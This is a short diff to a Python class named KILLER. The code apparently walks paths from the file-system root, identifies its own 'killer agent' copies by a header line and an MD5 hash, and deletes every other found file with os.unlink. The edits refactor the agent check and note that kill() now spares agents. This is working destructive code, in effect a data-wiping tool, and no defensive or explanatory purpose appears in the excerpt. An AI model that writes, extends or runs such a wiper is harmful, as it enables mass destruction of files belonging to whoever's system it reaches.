@@ -36,6 +36,7 @@ class KILLER():
 		'''
 		returns paths from root
 		'''
+
 		def lel(path):
 			return sum([1 for i in path.split(os.sep)])
 
@@ -68,15 +69,17 @@ class KILLER():
 			tempHash = 0
 		else:
 			with open(location, 'rt') as f:
-				if f.read(14) == '# killer agent':
-					try:
-						tempHash = h.md5(f.read().encode()).hexdigest()
-
-					except UnicodeDecodeError:
+				try:
+					ff = f.read()
+					if ff[:14] == '# killer agent':
+						tempHash = h.md5(ff.encode()).hexdigest()
+					else:
 						tempHash = 0
 
-				else:
+				except UnicodeDecodeError:
 					tempHash = 0
+
+		#print (tempHash)
 
 		for agentLoc, agentId in self.agents.items():
 			if agentId[0] == tempSize:
@@ -87,8 +90,9 @@ class KILLER():
 
 	def kill(self):
 		'''
-		deletes everything that was found by pfr()
+		deletes everything that was found by pfr(), except agents
 		'''
+
 		for i in self.Files:
 			if not self.checkFromAgents(i):
 				os.unlink(i)
